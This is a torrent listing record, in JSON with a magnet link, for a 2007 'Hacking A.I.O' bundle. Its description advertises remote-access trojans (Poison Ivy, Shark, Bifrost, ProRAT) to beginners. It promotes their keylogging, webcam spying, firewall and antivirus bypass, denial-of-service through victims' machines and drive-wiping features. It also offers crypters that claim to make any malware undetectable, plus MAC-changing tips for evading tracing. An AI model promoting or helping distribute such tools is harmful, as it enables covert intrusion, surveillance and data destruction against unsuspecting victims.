{"title":"Hacking A.I.O (Trojan's.Crypters.Scramblers.Packers) 09.04.2007","uid":3794996,"size":10458399,"categoryP":"applications","categoryS":"windows","magnet":"?xt=urn:btih:6f405fe39f3cbba2e28aa11f67fe2cdf2839b383&amp;dn=Hacking+A.I.O+%28Trojan%5C%27s.Crypters.Scramblers.Packers%29+09.04.2007&amp;tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&amp;tr=udp%3A%2F%2Fopen.demonii.com%3A1337&amp;tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&amp;tr=udp%3A%2F%2Fexodus.desync.com%3A6969","seeders":1,"leechers":0,"uploader":"babyjesus420","files":1,"time":1188896072,"description":"This is a very good collection of hacking tools. Included in the .RAR file is everything you need to start hacking right away\n\n                             Its Completly &quot;n00b proof&quot; \n\nI also included private Crypters/Scramblers/Packers to make &gt;ANY&lt; Trojan/KeyLogger/Malware/Virus 100% Undetected at scan time &amp; run time\n\n\n                    Here is what the total RAR file contains:\n\n\n          *** Collection of Trojans/RAT&amp;#039;s AKA &quot;Remote Admin Tools&quot; ***\n\n --Poison Ivy 2.3.0 RAT--\n\nPoison Ivy is an advanced, firewall bypassing, reverse connection, remote administration tool.\nThe main features are Camellia encrypted communications (with 256 bit password), transparent compression of transfers and communications, \nfull-featured file, registry, services and process manager, password manager, key logger, relay servers (socks 4 and 5, port redirect), \nremote screen capture, microphone capture and webcam viewing.\n\nThe server is only 7-9 KiB in size (depending on the settings), and due to the unique design concept, when a new version of Poison Ivy is released, \nyou will hardly ever need to update the server to take advantage of the new features.\nAlso the whole server can be used in totally independent shellcode format, as exported by the builder.\n\n --sharK 2.4.0 RAT--\n\nHere are some features of Shark-RAT:\nShark is an advanced remote administration tool written in VB6. With shark you will be able to administrate every PC in the world (using Windows OS) remotely. \n\nHere are some facts:\n\n* Shark uses DS2 to encrypt the traffic \n* Shark is able to resume downloads and uploads when the server disconnects on the next connect \n* Compressed Transfers \n* Thumbnail Previews of Pictures \n* Key logger works with Keyboard hooking \n* You have a real DOS-Shell instead of dos-output like in the most rats \n* Interactive Process Blacklist \n* Virtual-Machine detection\n\n --Bifrost 1.2.1 RAT--\n\nBifrost fwb+ is an advanced Remote Administration Tool that allows you to remotely control computers that are behind firewalls and routers. \nThat includes software firewalls that usually detects when a dll is injected.\nSome of the news for version 1.2:\nBetter ability to bypass firewalls\nConnection via Tor network\nFlags indicating country next to each connection\nKernel level process hiding\nKernel level API unhooking\nLots of more options in the builder\nPersistant server option\nRegistry Editor\nSome of the Features:\nCam Capture, Connection via sock4 proxy or Tor network, File Manager, File Search, Kernel Level File Hiding, Offline/Online Keylogger,\n\n --ProRAT_2.0SE--\n\n\nExterminator technology: In the Server Builder (very useful to create codes to totally moderate the security system of the victim before installing the server). \nWith Exterminator you can make your own XAF script files to bypassstopuninstall \nany security application in the victim system (antivirus, firewall, anti-spyware, folder protection, notifiers).Exterminator includes a very flexible scripting system \nwith dozens of options for Professional users.\n\nExterminator Actions Files (XAFs): To learn how to use the Exterminator, the examples include ones for Kaspersky, McAfee and NAV 2007 editions.\nDenial-Of-Service Attack feature: Which allows you to use your victim&amp;#039;s systems to make attacks to internet websites remotely. This version added 1 more method.\nStartup Bypass (SUB) option in the Server Builder: To bind the server with any of the startup items already in the victim system to totally trick the victim and startup monitors.\nFirewall Bypass (FWB) option in the Server Builder: To inject the server in any running process and/or hide the server process from task managers\nDamage functions including: Format Drives, Flood Drives, Delete Kernel files, and a new Plug-In for patching BIOS (may cause very much harm).\n\n\n*** Crypters/Scramblers/Packers ***\n\nThese tools let you encrypt ANY Type of detected malware eg.. Trojans/KeyLoggers/Malware/Virus etc.. and makes them 100% undetected\n\nKa0s Undetecter\n\nDaemon Crypt V2 Private\n\n\n*** IP &amp; Port scanners ***\n\nSuperScan 3.0\n\nThis is THE best tool for scanning remote computers for open ports/vurneable computers\n\n\n*** Other Tools ***\n\nResHacker 3.4.0\n\nThis is the #1 tool to modify exe&amp;#039;s (change icons, add bytes, dump binary code etc...) very useful.\n\nMacAddressChanger\n\nThis is also a really useful tool, it&amp;#039;s really WISE to change your MAC address before you start hacking\n\n\n\n************* ME NOR THE ORIGINAL AUTHORS OF THESE SOFTWARE(S) WILL NOT BE RESPONSIBLE FOR YOUR ACTIONS****************\n\n\nWith that now said HAVE FUN, AND PLAY NICE AND PLEASE SEED!!!! THANK YOU  \n\n\n(Leechers IP will be BANNED)\n","torrent":{"xt":"urn:btih:6f405fe39f3cbba2e28aa11f67fe2cdf2839b383","amp;dn":"Hacking+A.I.O+%28Trojan%5C%27s.Crypters.Scramblers.Packers%29+09.04.2007","amp;tr":["udp%3A%2F%2Ftracker.openbittorrent.com%3A80","udp%3A%2F%2Fopen.demonii.com%3A1337","udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969","udp%3A%2F%2Fexodus.desync.com%3A6969"],"infoHash":"6f405fe39f3cbba2e28aa11f67fe2cdf2839b383","infoHashBuffer":{"type":"Buffer","data":[111,64,95,227,159,60,187,162,226,138,161,31,103,254,44,223,40,57,179,131]},"announce":[],"urlList":[]}}